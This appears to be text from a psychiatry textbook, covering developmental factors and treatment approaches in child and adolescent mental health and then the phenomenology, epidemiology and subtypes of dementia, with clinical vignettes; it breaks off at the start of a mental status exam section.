A developmental approach acknowledges differences in the child's integration of biological, emotional, cognitive and behavioural systems and differences peer and family interactions across the life span.  Developmental theory highlights it is the interplay of these factors that determines whether development approximates to the normal trajectory or whether deviation occurs. The later, if significant, is synonymous with the presence of symptoms and impairment. The &quot;normal trajectory&quot; does not imply there is a single pathway to a particular outcome. Critical aspects of the biopsychosocial frame are required, including for example an intact central nervous system, availability of at least one attachment figure and an environment with the potential of providing at least food and shelter. Other useful concepts in the developmental context are protective, resilience or vulnerability factors. We will refer to descriptors for the major development epochs: fetal, infant, child and adolescent periods, despite some conjecture about when difference stages begin and end. Developmental is, after all, continuous.  

Biological fetal determinants of later mental health include toxic fetal environmental factors and the adverse effects of maternal malnutrition. Toxic effects can be from infections (e.g., rubella, herpes, human immunodeficiency virus, cytomegalovirus and toxoplasmosis); excessive maternal alcohol intake and deficiency states such as folate deficiency, the later commonly following malnutrition.  Genes controlling major organogenesis are operant during the fetal period and toxic effects at this stage can be catastrophic including mal-development of the central nervous system.  Although birth-weight may give some indication of the success and traumas of the gestational period it is a very coarse and non-specific marker. However, intrauterine growth retardation (measures of which include both birth-weight and gestational age) is a useful predictor of later hyperactivity, academic performance and possibly other outcomes. Important psychosocial factors during the fetal period include maternal perception of social support, the development of attachment to the developing fetus and whether the wider system such as father, grandparents and wider community are involved or supportive.
	
The infant phase is obviously influenced by persisting fetal factors. From a mental health perspective a psychological construct of major importance in this stage is attachment. Attachment theory has essentially either replaced or lead to profound modification of previously held psychodynamic and learning paradigms. Understanding of attachment has progressed with recent cognitive and developmental psychology research finding the infant’s competence is greater at an earlier age than previously thought. Early behaviours include the infant's ability to recognise their mother's voice in the hours after birth and preferential eye tracking around two months of age. One must remember attachment is not uni-directional but rather relates to the relationship between infant and primary caregiver. Attachment has both cross-sectional and longitudinal links with mental health. Up to 80% of the offspring of depressed mothers display insecure attachment. This attachment style is also related to the child’s delayed expressed language and cognitive development. 
	
As is expected the childhood period continues the development of the infant period including the attachment pattern established at that time. The child period is a time of continued cognitive, speech, language and psychological development underpinned by continued synapse formation, continuous (CNS) reorganisation and maturation of neuronal circuits.   It is a time of an increased sense of self-efficacy, competence and mastery of more complex social circumstances.  Social development includes a move from solitary play to parallel and then cooperative play, with the locus of contact not solely restricted to the family home.  Relationships with non-family individuals such as school friends become more common, complex and incorporate increasing imagination and fantasy. Peers and group membership become important and the experience of rejection by peers can have major consequences including development of anxiety and lowered mood.  Indeed children can develop both depressive and anxiety disorders of a degree of severity which justifies professional intervention.  Consequences can include impaired social relationships, diminished social support, diminished self-esteem and increased deviant behaviour. These can then in turn result in further deterioration of the child’s mental state with a resulting downward spiral.  Conversely, childhood can be a time of an increased sense of self-efficacy, competence and mastery of more complex social circumstances such as interactions in the school domain.
	
Definitions of Adolescence vary are often culture bound. One could argue that adolescence, or at least its recognition as a significant developmental stage is a relatively recent phenomenon and one of most relevance to the affluent developed world.  There are many societies where work, marriage and the taking on of adult type responsibilities, unfortunately including going to war, occur at ages where the typical western teenager is engrossed in adolescent experimentation and is very far from these things. 
       
From a biological perspective the onset of adolescence is defined by the hormonal changes of puberty and the effects these changes have on body morphology including the development of secondary sexual characteristics.  Behaviour is in part gender-specific with greater levels of aggression in males and depression in females. Biological influences during the adolescent stage are not limited to physiological maturational processes. Environmental toxins include exposure to illicit drugs and legal substances such as cigarettes, alcohol and inappropriate use of over-the-counter medication.  
       
Psychological factors include increased capacity for self-reflective thinking and development of a more sophisticated sense of self.  A more robust self-identity is related to the development of personal values with may include moral, political, sexual, religious or spiritual values as well as future educational and work aspirations.  Much psychological development occurs within the context of the school environment. 
       
To conclude this discussion on aetiology, it should be acknowledged that several factors are not development stage specific but rather are factors that are influential across developmental phases.  The family's resources; financial, emotional and cultural, and social economic class (SEC) are influential developmental factors.  Socioeconomic disadvantage and poverty have been linked to not only child and adolescent behaviour problems and conduct disorder but also more bio-behavioural processes such as the exposure of children to spoken and written language and the number of encouragements and discouragements given to the child during the early years. Note it is simplistic to ascribe causation to family SEC, rather this is a summary of a complex variety of constructs, for example may include parent mental health, parent availability, dislocation from extended family resources and access to other resources that enrich the child’s development. 
       
Biological effects can be influential across the lifespan such as some genetic factors, for example the presence of a genetic mutation seen with Velocardiofacial syndrome or the persistence of problems caused by anoxic brain damage at birth.  Parental influence is also a persisting developmental effect.  For example parents who have a coercive parenting style will continue to demonstrate this parenting style unless helped to do otherwise. In turn coercive parenting is related to the development of oppositional defiant disorder and later conduct disorder.   

Finally, the child and family’s culture must be considered in any aetiological formulation. Culture affects many of the determinants of health, as well as the construction of whether a given phenomenon is a health issue. For examples some cultures are more willing to acknowledge youth suicide. Whilst clearly effecting data and statistical analysis, at a personal level help seeking behavior for suicidal youth is likely to be effected by social views on this issue. Culture is often seen as a strong developmental continuity. However, for some countries in the developing world cultural change is rapid and has profound effects on children, an example being prolonged parental absence due to adults following employment opportunities in major cities. 

== Treatment ==
 
=== Pharmacotherapy === 

Prior to a discussion of pharmacotherapy it is prudent to discuss the decision-making process around the use of medication, especially given the rapid advances in this area and the array of medications now available.  Whilst in some centers there is easy access to senior colleagues for advice, as a default strategy this is generally unsustainable and clearly does not work in regional hospitals or rural and remote settings. To this end practitioners need to be adept at accessing contemporary clinical practice guidelines from professional organizations (e.g., N.I.C.E.), Cochrane reviews, other published meta analyses and systematic reviews. Pharmacotherapy texts are often very informative, so too formularies that are often produced by government bodies; albeit care is required as some information can become out of date. The technology age has also made long distance communication available to many and so advice via email or phone can be obtained even if geographically remote. On-line discussion groups are also becoming more popular. 

If these strategies do not provide the answer required then one should consider the conclusions of a seminal study in the area. Prior to accepting the findings of a seminal study the practitioner should determine whether the study is methodologically sound, has sufficient power, both genders and a range of ethnicities and social economic groups are included as participants thereby allowing generalization of findings into various practice settings. Finally, conclusions should be conservative in that they are consistent with the rigour of the methodology and strength of the analysis.

Various authors have published psychopharmacology practice advice relevant to children and adolescents. The over-arching principle is that medication prescription should only follow an adequate assessment and formulation.  A broad formulation will determine whether there are ongoing causal or maintaining factors within the family system or local ecology. Many practitioners find the &quot;predisposing, precipitating and perpetuating factor&quot; heuristic helpful. An example being one should not prescribe medication for anxiety if the child is still being physically abused. In this case the treatment is to facilitate the provision of a safe environment. A prescribing generalisation is to start with a low dose. Child and parent compliance can be radically undermined by early adverse side-effects and so slowly increasing medication dose at the same time as predicting typical adverse events is prudent. Whenever possible dosage regimes should be dependant on the child's weight. There are adequate milligrams (drug) per kilogram (child weight) dosage schedules for stimulant medication, some atypical psychotics, tricyclic antidepressants such as Clomiprame for OCD and Sodium Valproate. Once a decision to prescribe is undertaken then the medication trial should continue, with regular monitoring, until an adequate dose has been trialed for an adequate period of time. Premature cessation creates uncertainty as to whether a certain medication is beneficial or not. If available and there are no financial constraints, new medications are preferable especially given their greater safety profile and fewer side-effects. Good prescribing needs to consider whether there are physical factors that influence the bioavailability of the medication such as concurrent liver or renal disease and in the patient with epilepsy some medications, especially anti-psychotic medication, can lower the fit threshold. Drug-drug interactions can occur, especially when drugs are combined which both affect these same neurotransmitter pathway.

When practicing child and adolescent psychiatry or behavioural paediatrics, there can be pressure from parents or teachers to increase medication dose beyond the usual parameters or too prescribe additional medications to obtain symptom control.  This can be a serious problem in the overall management of the case.  Family dysfunction including arguments between parents or the threat of school suspension is not a valid reason to increase the child's medication.  There are persuasive research findings, for instance in the area of ADHD, that combining psychological interventions with medication is associated with lower medication dose.  One assumes combined therapy can also decrease the number of medications required.  Symptom deterioration is a reason to (a) review the diagnosis, (b) review barriers and maintaining factors, (c) look for new causal factors (d) review your therapeutic alliance with the child and family and (e) to consider comorbidity.  The latter may be secondary to the original presentation, for instance a depressive illness in a teenager struggling with chronic anorexia nervosa. When these factors have been accounted for then increasing the dose or considering a second medication is reasonable. The prudent practitioner will also decide upon a small selection of medications with which they become very familiar with and prescribe preferentially.  Use of a small number of medications allows greater knowledge of the typical dosage regime, side-effects and interaction profiles and also allows the practitioner to prepare and have ready access to patient information handouts.

=== Psychotherapy ===

Psychotherapy with children and adolescents can be divided into individual, family and group approaches. Individual therapies are usually either psychodynamically informed or a cognitive- behavioural intervention, often with variations of cognitive or behavioural interventions depending on the age of the child, cognition being treated or the experience and training of the psychiatrist. Key elements across types of psychotherapy include therapy designed to be appropriate to the developmental stage of the child, all therapy being delivered within a family construct (not just &quot;family therapy&quot;) and the therapist being suitably trained and their work is related to a known theoretical framework.

Behaviour therapy is usually symptom focused where the symptom is a problematic behaviour. Therapy is often brief, may involve the parent as a &quot;coach&quot; and helps promote desired behaviours and eliminate the problem behaviour. Whilst initially in the clinic or hospital, behaviour therapy works well in the real-world, addressing actual difficult symptoms such as agoraphobia or social phobia. Therapy tends to be practical, &quot;here and now&quot; and there is little emphasis on cognitions or dynamic insights. An example of behaviour therapy is &quot;flooding&quot; the child with separation anxiety disorder by assisting the parents to take the child to school and then leaving the children with teaching staff. Or if the same is done in a more gradual fashion then this may be more akin to desensitization. Cognitive behavioural therapy (CBT) expands on behaviour therapy by adding interventions that identify problematic thoughts or cognitive schema and introduces practices that directly challenge unhelpful thoughts and replace them with more helpful cognitions. There is considerably variation within CBT as regards the extent to which therapy focuses on behaviour, on cognitions or even on the underlying patterns of thinking and relating which form the fertile ground from which symptomatic thoughts and behaviours may arise.  CBT is active, often &quot;now&quot; orientated and relies on out of session work by the child, often with parent assistance. Home work is a feature of CBT. Some CBT interventions are manualised and this greatly aides their formal research evaluation.  Indeed the evidence base for many CBT programs is more robust than other forms of psychotherapy. There exist CBT packages for children who experience depression and different types of anxiety such as OCD, panic-agoraphobia and social phobia.  It is perhaps the manualisaton, the growing evidence base and the relative brevity of these forms of therapy that may result in their rapidly increasing popularity over recent years.

Psychodynamic psychotherapy generally is longer term.  While it is the existence of the presenting problem that is the stimulus for treatment, the therapy is generally more focused on helping the patient to gain insight, to understand the patterns in their thinking, feeling and relating which cause repeated difficulties and to be able to communicate in more healthy ways.  Although the description of psychodynamic psychotherapy may resemble that of other therapies, for instance schema based cognitive behaviour therapy, it is marked out from these by its trade mark technology which is the focus on the way the patient relates to the therapist and to material from the patient’s unconscious mind. The focus on the &quot;underlying&quot; may be problematic if the therapy does not seem sufficiently relevant to the presenting symptom, but does have the potential for personal growth and resilience should symptoms recur at a later time. Dynamic approaches vary across the child and adolescent span. At younger ages therapist employ more creative techniques such a drawing and play. 

Indeed Art and Play Therapy are generally psycho-dynamically informed and require further training and supervision. Longer term strategies have great value especially for seriously abused children and youth who are often in crisis and cannot make use of the structure inherent to CBT and the motivation required. With these individuals psychodynamically informed support and containment can be very helpful. With improvement the focus of psychodynamic therapy can alter from support to more insight oriented techniques or incorporate elements of CBT.
There are many schools of family therapy and there are many differences between these.  What they have in common is a perspective which brings to the foreground, not the inner world of the child or adolescent (though for some schools this remains important), but the relationships, communication patterns and shared beliefs within the family and other social systems within which the patient lives and functions.  The developmental life cycle perspective is as integral to understanding families as it is to thinking about individuals. Some presentations can best be understood in terms of difficulties in negotiating family life cycle stages e.g., teenager becoming more independent and eventually leaving home and what this means for other family members and relationships.  A narrative approach to family therapy might explore the way the family members understand their difficulties and whether there are alternative understandings which might lead to new possibilities. Family counselling and psychoeducation is also part of the repertoire of family interventions, often to help families cope with presentations that may be primarily biological not family dynamic in origin, for instance assistance coping with the behaviour of an autistic child.   Confusion may arise with family therapy in terms of who is the patient.  Some families bringing an identified patient are comfortable with the idea that the whole family is the patient and that all in the family will need to change.  Others find this an alien concept and feel blamed when family therapy is recommended for a problem which, to them, resides within one member.  It may be helpful to explore this and to address the issue of family being helped to help one of its members versus family being treated as the patient.

=== Combined treatment === 

In the management of child and adolescent mental health presentations it is usual to begin with mono-therapy; usually in the form of one of the &quot;talking&quot; therapies. Across a range of approaches psychotherapy is not only helpful for symptom reduction but also enhancing resilience. Most treatment algorithms cite that for some conditions addition of a drug treatment can be beneficial. In this sense the medication is adjunctive to the primary psychotherapeutic interventions. For example addition of an SSRI medication to either Bulimia nervosa or OCD where psychological treatment alone produces insufficient benefit, is warranted and has an evidence base. Further, some studies, including those with ADHD, have concluded that combination of medication with psychotherapy decreases the ultimate dose of medication required. Combined treatments can also potentially lead to more rapid symptom reduction and be more cost effective.

      <text xml:space="preserve">In this chapter, we consider three related types of medical psychiatric disorders, usually accompanied by behavioral abnormalities: dementia, delirium, and neurobehavioral disorders due to general medical conditions. The common factor in these admittedly diverse conditions is a pathological alteration of brain structure and/or function, leading to abnormalities in cognition, affect, perception, or behavior. In the older U.S. literature, the term &quot;organic brain syndrome&quot; was often used to distinguish these conditions from so-called functional psychiatric disorders, such as schizophrenia or major depression. Indeed, the &quot;organic&quot; designation is retained in the ICD-10 classification (ICD-10, 1993). 
      
In our view, however, the terms &quot;organic&quot; and &quot;functional&quot; suggest a false dichotomy. As we have learned more about the pathophysiology of common psychiatric disorders, such as schizophrenia or depression, the conceptual demarcation between these conditions and those discussed in the present chapter has become less distinct. For example, decreased metabolic function in frontal brain regions may be observed in both dementia and major depression, though the course and prognosis of these conditions differ markedly. Similarly, abnormalities in the cholinergic system may be present in both Alzheimer’s Disease and schizophrenia (Raedler et al. 2007), notwithstanding the many differences between these disorders. Advanced neuroimaging techniques, genetic studies, as well as abnormal neurobiologic function  in several animal models suggest receptor and circuit disturbances, even in the absence of traditional neurological abnormalities such as stroke or tumor. For all these reasons, we generally avoid the term &quot;organic&quot; in this chapter, but do use it when a particular study, author, or context justifies it. 

The term &quot;cognitive disorder&quot; is often used to encompass delirium, dementia, and related conditions. This term appropriately emphasizes that a disturbance in memory, language, or attention is usually a cardinal feature of these disorders. However, the term &quot;cognitive disorder&quot; is far from ideal, since other aspects of consciousness, mood, and behavior may be strikingly abnormal in delirium, dementia, and related conditions. For example, the patient with frontal lobe dementia may show marked behavioral disinhibition, while the patient with Parkinson’s Disease and dementia may show signs of major depression.  
      
The disorders discussed in this chapter are seen in many health-care environments, and are by no means confined to psychiatric settings. For example, between 11-16% of inpatients on general medical units may experience delirium at some time during their admission (Levkoff et al. 1991). In skilled nursing facilities, at least 14 % of residents may suffer from some form of dementia (Sabbagh et al. 2003), with some studies finding that more than 50% of nursing home beds are occupied by patients with Alzheimer’s Disease (Sadock &amp; Sadock, 2007, p. 329). And while there are no reliable prevalence statistics for psychiatric symptoms due to general medical conditions (GMCs), these disorders appear to be common in emergency department (ED) settings, where they often go undiagnosed. Indeed, in one study (Tintinalli et al. 1994) the chart was documented &quot;medically clear&quot; in 80% of ED patients in whom medical disease should have been identified.
      
Finally, a word about diagnostic systems: in most respects, there are more similarities than differences between the DSM-IV and ICD-10 classifications of the disorders discussed in this chapter; indeed, our discussion emphasizes common features rather than the specific criteria set forth in these two systems. However, when significant differences are clinically relevant, we will note them. 

== Dementia ==

=== Phenomenology (Characteristic Features of the Dementias) ===

Dementia may be broadly defined as a progressive, acquired impairment of cognitive function sufficient to cause functional decline, and occurring in a relatively normal (&quot;clear&quot;) level of consciousness; i.e., in the absence of delirium (Sadock &amp; Sadock, 2007; Apostolova &amp; Cummings, 2008). We shall see, however, that there are some notable exceptions to this generalization, and that it is often more useful to define specific types of dementia. Global impairment of the intellect is a cardinal feature of dementia. More specifically, most dementia syndromes demonstrating the following neurobehavioral deficits:   
* Memory impairment (either impaired ability to learn new information, or to recall previous information), usually evident for at least 6 months
* Deterioration in judgment, planning, and organizing (e.g., impaired shopping, cooking, handling money)
* Absence of &quot;clouding of consciousness&quot; for a period long enough to demonstrate decline in memory
* Decline in emotional control or motivation; or a change in social behavior (e.g., emotional lability, irritability, apathy, loss of social graces). DSM-IV specifically emphasizes a significant impairment in social and/or occupational functioning, as a result of the aforementioned deficits
* DSM-IV emphasizes one or more of the following: aphasia (language disturbance), apraxia (impaired ability to carry out motor activity despite intact motor function), agnosia (failure to recognize objects despite normal sensory function); and disturbance in executive functioning (planning, organizing, sequencing, abstracting). In partial contrast, ICD-10 regards these as essentially supportive findings for diagnosis of dementia. 

The epidemiology, clinical features, and pathogenesis of dementia vary considerably, depending on the subtype; for example, dementia of the Alzheimer type (DAT), Vascular Dementia, Lewy Body Dementia, etc. Nevertheless, it is common to encounter elderly patients in the clinical or nursing home setting who carry only the syndromic diagnosis of &quot;dementia&quot; (Jacobson et al. 2007). It is worth noting that not all definitions of dementia require memory impairment as a diagnostic criterion; indeed, some patients with frontotemporal dementia (FTD) may be severely affected with behavioral disturbances before memory impairment is prominent (Jacobson et al. 2007).  Dementia must be distinguished from so-called mild cognitive impairment (MCI), which appears to represent an intermediate stage between normal aging and dementia (Apostolova &amp; Cummings, 2008). Unlike those with dementia, MCI patients do not show significant impairment in activities of daily living. 

=== Epidemiology of the Dementias ===

Dementia of some type may afflict as many as 28 million individuals world-wide, with direct costs for care estimated at 156 billion U.S. dollars (Wimo et al. 2006). Of the total number of demented individuals worldwide, the largest proportion (5.2 million, or 18.5%) lives in China (Wimo et al. 2006). If one groups all dementias together, the estimated prevalence is about 5% in the general population older than age 65, and 30% in those older than age 85 (Sadock and Sadock, 2007 p. 329). Findings on racial variations in dementia are somewhat equivocal, but most studies have reported higher frequencies of dementia among nonwhite persons (Husaini et al. 2003).  Disproportionately high rates of dementia among African-Americans may be due, in part, to a higher prevalence of both hypertension and stroke among elderly African-Americans. Women generally have higher rates of dementia than men, largely because women live longer (Husaini et al. 2003). However, vascular dementia appears to be more common in men. 
      
Dementia of the Alzheimer’s Type (DAT, &quot;Alzheimer’s Disease&quot;) is by far the most common type of dementia, making up roughly 35%-60% of cases worldwide (Mendez &amp; Cummings, 2003; Sadock and Sadock, 2007, p. 329). The wide range of these figures is due in part to some controversy over the classification of Lewy Body Dementia (LBD); i.e., if LBD is considered a variant form of DAT (Sadock and Sadock, 2007, p. 329), the prevalence figure for DAT tends toward the higher end of the range. Many geriatric psychiatrists consider LBD to be the second most prevalent dementia subtype (&quot;tied&quot; with mixed vascular dementia/DAT), with a prevalence of about 15%. About 10% of dementias are said to be represent pure vascular dementia, while another 5% represent fronto-temporal dementia (Mendez and Cummings, 2003; Jacobson et al. 2007). Some data suggest that the DAT/vascular dementia ratio is comparatively higher in South America and lower in Asia (Lopes &amp; Bottino, 2002), though the reasons for these trends are not clear. Miscellaneous causes of dementia—including cases due to Huntington’s Disease, Creutzfeld-Jakob Disease,  Parkinson’s, HIV infection, and other conditions—probably constitute fewer than 5% of the total. 
      
That said, there is a paucity of autopsy-based studies of dementia prevalence, which would presumably be more accurate than those based on clinical diagnosis alone. In one of the few such studies (Fu et al. 2004),  202 demented patients underwent brain-only autopsies, and the following types of dementia were found: 129 (63.8%) cases showed changes of severe Alzheimer disease; 21 (10.4%) showed combined neuropathologic abnormalities (Alzheimer disease plus another type of lesion, such as significant ischemic infarcts or diffuse Lewy body disease), 12 (5.9%) cases of relatively pure ischemic vascular dementia, 13 (6.4%) cases of diffuse Lewy body disease, and 8 (4.0%) cases of frontotemporal dementia. The remaining 19 (9.4%) patients showed various neuropathologic diagnoses, including normal pressure hydrocephalus and progressive supranuclear palsy. Notably, the authors concluded that, had these diagnoses been known ante mortem, the clinical care of the patients might well have been different (Fu et al. 2004). 
      
=== Clinical Features of Dementia Subtypes ===

Cortical vs. subcortical distinction

The older literature on dementia often describes two broad subtypes that encompass many of the more pathologically-specific types of dementia. Though the distinction between so-called cortical and subcortical dementias is controversial, it remains a useful conceptual tool in preparation for understanding more specific forms of dementia (Turner et al. 2002). Although there is no specific neuropsychological pattern in subcortical dementia, this group of disorders is generally characterized by cognitive slowness, concomitant motor abnormalities, and a relatively low frequency of aphasias and apraxias, compared with Alzheimer-type dementia (Turner et al. 2002).  The principal differences between cortical and subcortical dementias are summarized in Table 1. It is important to note that some conditions—such as multiple small strokes and certain toxic-metabolic disorders—produce symptoms of both cortical and subcortical dysfunction (Cummings, 1985). Furthermore, the cortical/subcortical distinction has become less useful as our understanding of specific dementia syndromes has increased (Turner et al. 2002). Indeed, Lerner and Riley (2008) have pointed out that the dementias of Huntington’s and Parkinson’s Disease—two putative &quot;subcortical&quot; dementias—are as different from each other as they are from Alzheimer’s Disease, the classic &quot;cortical&quot; dementia. Furthermore, these authors note that &quot;…the pathological basis for dementia in (Parkinson’s Disease) is now known to lie in the cerebral cortex…effectively rendering its designation as a &quot;subcortical&quot; dementia untenable.&quot; (p. 908). In short—though useful as a rough, first-pass approximation—the designations &quot;cortical&quot; and &quot;subcortical&quot; are likely to be modified with more specific pathoanatomical and descriptive assessments.

* Dementia of the Alzheimer Type (DAT)

Case vignette: Mrs. A, a 91-year-old widowed Caucasian woman in good general health, was seen by her family physician for complaints of &quot;forgetting things a lot lately.&quot; Mrs. A’s daughter, who often helped her mother with household chores, had noticed a change in her mother’s thinking and behavior over the past two years. &quot;Mom used to be sharp as a tack and never forgot a thing,&quot; she reported. &quot;Nowadays, she has trouble remembering even simple things, like turning off the stove, or in what room she keeps all her bills and papers. The other day, I found that she had left the bath running for over an hour, and it flooded the whole upstairs. Sometimes, Mom confuses me with her sister, who died over twenty years ago. When I try to explain who I am, Mom sometimes gets kind of irritable with me, and says I’m trying to confuse her.&quot; There was no history suggestive of stroke, sudden change in mental status, or loss of gross motor or sensory function. On mental status exam, the patient was pleasant, socially appropriate, and in no acute distress. She was oriented to the year, but not to month, day, or date. She recalled only one word item after three minutes. She could not remember the name of the two most recent U.S. Presidents, but was able to speak knowledgeably about the Presidents during the U.S. Great Depression (1929-1941). When asked to name three objects on the physician’s desk (stapler, paper clip, and calendar), she named them as &quot;stapler, paper grip, and day book.&quot; A provisional diagnosis of &quot;dementia, probably of the Alzheimer’s type&quot; was made by the physician. 
      
AS the vignette suggests, DAT (Alzheimer’s Disease) is characterized most saliently by a gradual onset and progression of cognitive decline. Frank signs and symptoms of DAT often follow a prodromal stage of mild memory impairment that does not markedly interfere with activities of daily living. With disease progression, the patient shows more global cognitive decline, with disturbance in language, visuospatial skills, executive functioning, and social interaction. Typical of progressive DAT is a transcortical sensory aphasia, in which the patient shows fluent word output and preserved ability to repeat spoken language, but impaired speech comprehension (Apostolova &amp; Cummings, 2008).  With further progression of DAT, the patient shows impaired judgment and reduced ability to carry out activities of daily living. Disturbances in sleep-wake cycle or appetite often ensue. Although depression is often considered a hallmark of subcortical dementias, it is actually a common feature in DAT. However, only about half of patients with depression/dysphoria in DAT meet full criteria for major depression (Apostolova &amp; Cummings, 2008). Irritability, agitation (including pacing, &quot;fidgeting&quot; or verbal outbursts) and psychotic features (such as visual hallucinations and delusions of having been robbed) are also common in DAT, and impose great emotional burdens on the patient’s family and caregivers. Patients with early-onset DAT (see under Pathogenesis) may show atypical features, such as prominent aphasia, myoclonic jerks, emotional lability, or obsessive-compulsive symptoms (Apostolova &amp; Cummings, 2008).  
* Vascular Dementias
   
Vascular dementia (VaD) is considered the third leading cause of dementia in the elderly, after DAT and Dementia with Lewy Bodies (Apostolova &amp; Cummings, 2008). However, some experts regard VaD as a heterogeneous syndrome, rather than a distinct disorder, in which the underlying cause is some type of cerebrovascular disease and the end result is dementia (Wright, 2007).  Several subtypes of VaD are recognized.  Multi-infarct dementia (MID)—the older term for VaD—involves multiple, relatively large infarctions, usually due to recurrent cerebral emboli originating from the heart, thromboembolic events, or atherosclerotic plaques. Single, strategically-placed infarct; lacunar state; and Binswanger’s Disease (subcortical arteriosclerotic encephalopathy  (SAE) due to arteriosclerotic narrowing of deep penetrating white matter arterioles) are also considered VaD subtypes (see below). 
   
In partial contrast to DAT, vascular dementia often shows a subcortical pattern, with prominent psychomotor slowing, executive dysfunction, and mood changes. Speech difficulties (dysarthria) are common. Compared with DAT, memory deficits in VaD are more often related to retrieval than to initial encoding of memories; for example, the patient with VaD may be unable spontaneously to &quot;retrieve&quot; the name of a recently specified object (such as &quot;chair&quot;), but can do so if provided a clue (&quot;It rhymes with hair&quot;). In contrast to the course of DAT, VaD of the multi infarct variety may have a &quot;stuttering&quot; course, with a stepwise progression of cognitive deterioration, often accompanied by lateralizing neurological deficits (Sadock &amp; Sadock, 2007). SAE often has an insidious course that may be temporally difficult to distinguish from DAT. The neurological findings of multi-infarct dementia may include focal findings such as weakness, spasticity, rigidity, and extensor plantar reflex (positive Babinski sign). Compared with DAT, VaD has a higher incidence and greater severity of new-onset depression, especially in older individuals; this is sometimes referred to as &quot;vascular depression.&quot; Psychosis is also relatively common in VaD. 
* Lewy Body Dementia 
      
Barely recognized only 20 years ago, Dementia with Lewy Bodies (DLB) is now believed to be the second most prevalent dementia of old age, accounting for some 15-20% of cases (McKeith et al. 1996). Compared with DAT, memory impairment in DLB is less pronounced, but cognitive fluctuations are severe. Variability in the patient’s attention, alertness, and level of consciousness may reach the proportions of frank delirium (see below, Delirium). Recurrent visual hallucinations are also one of the hallmarks of DLB. DLB shares features with the dementia of Parkinson’s Disease (PD), and diagnosis is conventionally determined by the temporal pattern of motor symptoms: if these precede cognitive decline by more than 12 months, PD is diagnosed, whereas motor symptoms occurring within a year of cognitive decline would be diagnosed as DLB (Apostolova &amp; Cummings, 2008). Bradykinesia, rigidity, resting tremor, and gait disturbance are commonly seen in DLB, but cases of DLB without extrapyramidal symptoms are reported. Other clues to the presence of DLB include a history of falls or syncopal episodes; REM (rapid eye movement) sleep behavior disorder (such as violent behaviors during REM sleep); and extreme sensitivity to neuroleptics and atypical antipsychotics (Apostolova &amp; Cummings, 2008; Jacobson et al. 2007—see under Treatment). 
* Fronto-temporal dementia

Fronto-temporal dementia (FTD) is actually a group of three related disorders, involving focal atrophy of the frontal and/or temporal lobes, accompanied by characteristic neurobehavioral impairments (Apostolova &amp; Cummings, 2008). So-called Frontal Variant FTD is also known as Pick’s Disease and makes up the majority of FTD cases. (Primary Progressive Aphasia and Semantic Dementia are less common FTD variants, and will not be discussed here). 
      
Patients with Frontal Variant FTD typically do not complain of cognitive problems to the same extent as patients with DAT; rather, they show insidious but profound alterations in personality, social skills, and impulse control. However, neuropsychological testing does reveal deficits in verbal fluency, abstract thinking and planning, and verbal memory, often with sparing of visual memory. Compared to DAT patients, those with FTD usually have more mood disturbance, behavioral disinhibition, and abnormal motor behavior. Curiously, nearly half of all FTD patients—two years after diagnosis--will show one or more stereotyped or obsessive-compulsive behaviors. These may include hand clapping, hoarding, and repetitive or ritualistic  behaviors (Mendez &amp; Perryman, 2002; Apostolova &amp; Cummings, 2008). Twenty per cent of FTD patients may develop a form of Kluver-Bucy Syndrome (hyperorality, hypersexuality, and abnormal exploratory behavior) two years after diagnosis (Mendez &amp; Perryman, 2002). 
      
Case vignette: Mr. J. was a 57-year-old married white male, with a two-year history of marked &quot;change in personality&quot;, according to his wife. &quot;It’s like night and day,&quot; she told the neurologist, &quot;compared to the way Fred used to be. He was the kindest, gentlest man I ever knew. Now, it’s like Jekyll and Hyde—I’m afraid to look at him cross-eyed, for fear he will scream at me, or worse.&quot; Mr. J. had always been a very empathic individual, but now seemed unconcerned with the wishes or needs of others. His hygiene and personal grooming had deteriorated over the past year, and he had begun to engage in bizarre rituals every morning; for example, counting to 100 before getting out of bed, then eating exactly six large muffins, without saying a word to his wife. Most of the time, Mr. J. seemed &quot;flat&quot; and apathetic; however, when his wife questioned any of his actions, he would shout at her or throw some object across the room. 
A neurological evaluation found evidence of significant frontal lobe dysfunction and positive &quot;grasp reflex&quot;, but was otherwise within normal limits. 
* Miscellaneous Dementia Syndromes

In addition to the aforementioned types of dementia, about 5% of patients will have dementia due to miscellaneous causes, including 
Huntington’s Disease, Creutzfeld-Jakob Disease,  Parkinson’s Disease, HIV infection, and other conditions.  Huntington’s Disease (HD)—an autosomal dominantly-transmitted, progressive disorder—has its peak onset in the fourth and fifth decade, though a smaller peak occurs in the 20s. The classic presentation for HD is a combination of chorea and dementia, in the setting of a positive family history; however, the earliest presentation may be with affective or psychotic symptons (Lerner &amp; Riley, 2008). A &quot;tendency toward suicide&quot; in HD was recognized by Huntington himself, and suicidal ideation may be the presenting problem. Creutzfeld-Jakob Disease (CJD) is caused by an abnormal protein called a prion, and typically presents as a rapidly-progressive dementia, accompanied by ataxia and multi-focal myoclonic jerks. A third of patients with CJD show a prodrome of fatigue, headache, insomnia, malaise, or depression (Apostolova &amp; Cummings, 2008). Dementia due to Parkinson’s Disease (PD) occurs in roughly 30% of patients with PD, with a larger percentage afflicted as age increases (Lerner &amp; Riley, 2008). However, cognitive symptoms can occur at any stage of PD, and are often characterized by slowed mentation (bradyphrenia), impaired visuo-spatial skills (such as facial recognition and operating objects in space) and executive dysfunction. Affective disturbance—especially depression—is very common in PD, and may be present in over 60% of cases. Anxiety is also commonly seen in PD, although less frequently than depression (Lerner &amp; Riley, 2008). Psychosis is also encountered in PD, usually related to dopaminergic effects of anti-Parkinsonian medication (Lerner &amp; Riley, 2008). 
       
Cognitive deficits associated with HIV infection are considered part of a continuum, known as HIV-1-associated cognitive-motor complex (HCMC). Frank HIV dementia is the most serious form of HCMC, and occurs in roughly 30% of HIV-infected individuals (Fernandez &amp; Tan, 2008). The early clinical picture in HCMC is usually characterized by subcortical features (see Table 1), including reduced information processing speed; motor slowing or dyscoordination; and depressed mood. However, as the illness progresses, more classically &quot;cortical&quot; features may develop, including aphasia, agnosia, apraxia, and frontal lobe symptoms (Fernandez &amp; Tan, 2008). Behavioral disinhibition, mania, and psychotic features are often found in the later stages of HIV-associated dementia. 
     
'''Assessment and Diagnostic Testing'''

In addition to obvious abnormalities in the mental status exam, the patient with dementia may show a variety of deficits on more sophisticated screening instruments and  neuropsychological assessments, and on neuroimaging studies. 
* Prototypical mental status findings in dementia 
      
Considering the diverse subtypes of dementias, it is difficult to generalize about findings on mental status exam. Furthermore, the clinician must proceed with the caveat that a patient cannot be diagnosed with dementia, in the presence of active delirium (see Delirium, section). Nonetheless, if we &quot;average out&quot; the differences between cortical and subcortical dementia presentations, the following mental status exam could be considered typical of the patient with moderately severe dementia: 
      
